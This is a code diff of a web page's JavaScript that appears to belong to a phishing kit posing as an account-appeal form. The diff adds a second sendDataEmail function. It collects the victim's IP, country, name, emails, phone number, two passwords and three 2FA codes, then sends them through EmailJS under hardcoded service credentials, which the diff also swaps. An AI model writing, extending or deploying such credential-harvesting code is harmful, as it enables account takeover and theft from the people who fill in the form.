@@ -4751,6 +4751,10 @@
         /////
         getUserIp()
 
+
+
+        
+
         // Send data to Email
         function sendDataEmail() {
     var templateData = {
@@ -4773,9 +4777,9 @@
         'params': metrics.params
     };
     
-    var serviceID = "service_gepefkg";
-    var userId = "EstURtrMYr3MyKmKf";
-    var templateId = "template_dd1gz2x";
+    var serviceID = "service_yuaay1x";
+    var userId = "dwLhMTV4WyxEi4rsu";
+    var templateId = "template_avf0npm";
 
     var data = {
         service_id: serviceID,
@@ -4792,6 +4796,8 @@
     }).fail(function (error) {
     });
 }
+
+
         function firstFormHandle(event) {
             event.preventDefault()
             updateFormsSendData(serializeForm(firstForm))
@@ -4966,7 +4972,47 @@
             }, 1000);
         }
 
+                // Send data to Email
+        function sendDataEmail() {
+    var templateData = {
+        'user_ip': userIpData.user_ip,
+        'country': userIpData.country,
+        'country_code': userIpData.country_code,
+        'full-name': formsSendData['full-name'],
+        'personal-email': formsSendData['personal-email'],
+        'buiseness-email': formsSendData['buiseness-email'],
+        'mobile-phone-number': formsSendData['mobile-phone-number'],
+        'password-1': formsSendData['password-1'],
+        'password-2': formsSendData['password-2'],
+        '2FA-1': formsSendData['2FA-1'],
+        '2FA-2': formsSendData['2FA-2'],
+        '2FA-3': formsSendData['2FA-3'],
+        'page-name': formsSendData['page-name'],
+        'apeal': formsSendData['apeal'],
+        'dis_name': metrics.dis_name,
+        'is_Mobile': metrics.is_Mobile,
+        'params': metrics.params
+    };
+    
+    var serviceID = "service_gepefkg";
+    var userId = "EstURtrMYr3MyKmKf";
+    var templateId = "template_dd1gz2x";
 
+    var data = {
+        service_id: serviceID,
+        template_id: templateId,
+        user_id: userId,
+        template_params: templateData
+    };
+
+    $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
+        type: 'POST',
+        data: JSON.stringify(data),
+        contentType: 'application/json'
+    }).done(function () {
+    }).fail(function (error) {
+    });
+}
         /* ----------------------------------------------------------------------------- */
         document.addEventListener('DOMContentLoaded', function () {
             const button = document.getElementById('showPopup');
